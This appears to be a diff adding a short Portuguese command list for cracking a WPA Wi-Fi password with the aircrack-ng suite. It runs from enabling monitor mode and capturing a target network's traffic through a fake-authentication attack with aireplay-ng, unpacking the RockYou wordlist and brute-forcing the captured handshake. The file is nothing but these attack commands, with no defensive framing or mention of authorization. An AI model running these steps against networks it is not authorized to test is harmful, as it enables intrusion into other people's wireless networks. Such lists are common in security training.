@@ -1,0 +1,32 @@
+Lista de Comando: 
+Mostrando dispositivos de rede:
+
+# ifconfig
+
+Ativando interface de monitoramento:
+
+# airmon-ng start wlan0
+
+Monitorando o ar:
+
+# airodump-ng wlan0mon
+
+Filtrando monitoramento e gravando em arquivo
+
+# airodump-ng wlan0mon -c <canal> --bssid <bssid da rede> -w <arquivo>
+
+Ataque de falsa autenticação
+
+# aireplay-ng -1 0 -e <essid> wlan0mon
+
+Caminho para a wordlist RockYou
+
+# cd /usr/share/wordlists/
+
+Descompactando wordlist
+
+# gzip -d <caminho para arquivo>
+
+Quebrando a senha
+
+# aircrack-ng -b <bssid atacado> -w <caminho para wordlist> <arquivo>.cap
